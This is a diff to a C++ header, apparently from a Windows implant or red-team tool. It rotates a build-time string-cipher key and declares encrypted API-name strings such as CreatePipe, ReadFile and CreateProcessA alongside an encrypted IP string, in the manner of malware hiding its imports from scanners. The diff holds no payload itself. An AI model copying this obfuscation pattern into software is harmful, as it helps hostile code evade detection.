@@ -2,8 +2,8 @@
 
 #include <array>
 
-#define BUILD_TIME_CIPHER_BYTE (unsigned char)((i % 4 | ((i * 9) * 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i - BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << 16) ^ 228)
-static std::array<uint8_t, 16> BUILD_TIME_KEY = { 138, 86, 75, 209, 18, 43, 190, 26, 123, 45, 168, 111, 49, 114, 178, 6 };
+#define BUILD_TIME_CIPHER_BYTE (unsigned char)((i % 4 | ((i - 9) * 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i - BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << 16) ^ 70)
+static std::array<uint8_t, 16> BUILD_TIME_KEY = { 4, 15, 54, 58, 112, 232, 34, 171, 94, 167, 67, 218, 14, 122, 67, 1 };
 
 extern unsigned char str_ip[];
 extern size_t str_ip_len;
@@ -67,6 +67,24 @@ extern size_t str_Process32First_len;
 
 extern unsigned char str_Process32Next[];
 extern size_t str_Process32Next_len;
+
+extern unsigned char str_CreatePipe[];
+extern size_t str_CreatePipe_len;
+
+extern unsigned char str_SetHandleInformation[];
+extern size_t str_SetHandleInformation_len;
+
+extern unsigned char str_ReadFile[];
+extern size_t str_ReadFile_len;
+
+extern unsigned char str_FormatMessageA[];
+extern size_t str_FormatMessageA_len;
+
+extern unsigned char str_LocalFree[];
+extern size_t str_LocalFree_len;
+
+extern unsigned char str_CreateProcessA[];
+extern size_t str_CreateProcessA_len;
 
 extern unsigned char str_kernel32[];
 extern size_t str_kernel32_len;
